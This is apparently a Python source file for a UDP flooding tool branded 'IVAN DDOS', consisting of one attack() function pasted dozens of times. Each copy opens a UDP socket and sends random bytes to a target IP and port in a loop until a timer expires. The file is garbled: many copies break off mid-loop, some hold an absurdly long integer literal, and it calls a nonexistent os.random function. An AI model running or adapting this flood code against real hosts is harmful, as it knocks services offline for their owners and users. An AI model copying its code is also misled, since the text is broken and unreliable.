        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
